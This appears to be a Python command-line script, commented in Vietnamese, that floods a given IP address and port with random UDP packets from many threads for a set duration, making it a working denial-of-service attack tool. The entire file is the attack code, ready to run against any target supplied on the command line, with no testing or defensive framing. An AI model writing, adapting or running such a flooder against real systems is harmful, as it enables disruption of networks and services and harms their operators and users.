import socket
import random
import threading
import time
import sys

# Hàm gửi gói UDP
def udp_flood_with_delay(ip, port, duration, delay_ms):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(512)  # Chọn kích thước nhỏ cho gói tin

    while time.time() < timeout:
        sock.sendto(data, (ip, port))
        time.sleep(delay_ms / 1000.0)  # Điều chỉnh thời gian giữa các gói tin

# Hàm tấn công với nhiều luồng
def start_attack(ip, port, threads, duration, delay_ms):
    print(f"Đang gửi UDP đến {ip}:{port} với {threads} luồng, delay {delay_ms}ms trong {duration}s...")
    for _ in range(threads):
        threading.Thread(target=udp_flood_with_delay, args=(ip, port, duration, delay_ms)).start()

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(f"Usage: python {sys.argv[0]} <IP> <PORT> <THREADS> <TIME> <DELAY_MS>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    delay_ms = int(sys.argv[5])

    start_attack(ip, port, threads, duration, delay_ms)
